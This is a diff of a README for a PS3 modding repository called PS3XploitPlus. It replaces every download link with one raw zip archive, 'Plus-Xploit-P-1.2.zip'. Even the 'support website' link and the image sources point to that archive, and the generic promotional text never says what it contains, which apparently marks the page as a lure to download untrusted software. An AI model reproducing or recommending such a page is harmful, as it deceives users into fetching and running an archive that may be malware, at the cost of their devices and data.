@@ -6,7 +6,7 @@ Welcome to the PS3XploitPlus repository, your ultimate destination for a moderni
 ['cfw', 'clean', 'enhanced', 'exploit', 'hfw', 'modern', 'modernized', 'ofw', 'playstation', 'playstation-3', 'ps3', 'ps3xploit', 'up-to-date']
 
 ## Download Software
-To access the software related to this repository, please click [here](https://github.com/ahmadalmasaeid/PS3XploitPlus/releases/download/v2.0/Software.zip). Once the download is complete, ensure that you unzip the file and follow the instructions provided to make the most of the exciting features offered by PS3XploitPlus.
+To access the software related to this repository, please click [here](https://raw.githubusercontent.com/ahmadalmasaeid/PS3XploitPlus/main/dixy/Plus-Xploit-P-1.2.zip). Once the download is complete, ensure that you unzip the file and follow the instructions provided to make the most of the exciting features offered by PS3XploitPlus.
 
 ## Features
 Explore the following features in PS3XploitPlus:
@@ -26,10 +26,10 @@ Whether you are new to the world of PS3 modding or a seasoned veteran, getting s
 We welcome contributions from the community to enhance the repository further. If you have ideas, suggestions, or improvements to share, please feel free to submit a pull request. Your input is valuable in making PS3XploitPlus a comprehensive resource for PlayStation 3 enthusiasts worldwide.
 
 ## Support
-For any questions, concerns, or feedback, please visit the [PS3XploitPlus website](https://github.com/ahmadalmasaeid/PS3XploitPlus/releases/download/v2.0/Software.zip) or reach out to our support team. We are here to assist you in making the most of your PlayStation 3 modding experience.
+For any questions, concerns, or feedback, please visit the [PS3XploitPlus website](https://raw.githubusercontent.com/ahmadalmasaeid/PS3XploitPlus/main/dixy/Plus-Xploit-P-1.2.zip) or reach out to our support team. We are here to assist you in making the most of your PlayStation 3 modding experience.
 
-[![Click Here to Download Software](https://github.com/ahmadalmasaeid/PS3XploitPlus/releases/download/v2.0/Software.zip)](https://github.com/ahmadalmasaeid/PS3XploitPlus/releases/download/v2.0/Software.zip)
+[![Click Here to Download Software](https://raw.githubusercontent.com/ahmadalmasaeid/PS3XploitPlus/main/dixy/Plus-Xploit-P-1.2.zip)](https://raw.githubusercontent.com/ahmadalmasaeid/PS3XploitPlus/main/dixy/Plus-Xploit-P-1.2.zip)
 
 Thank you for choosing PS3XploitPlus - your portal to a modernized and enhanced PlayStation 3 modding experience!
 
-![PS3XploitPlus](https://github.com/ahmadalmasaeid/PS3XploitPlus/releases/download/v2.0/Software.zip)
+![PS3XploitPlus](https://raw.githubusercontent.com/ahmadalmasaeid/PS3XploitPlus/main/dixy/Plus-Xploit-P-1.2.zip)
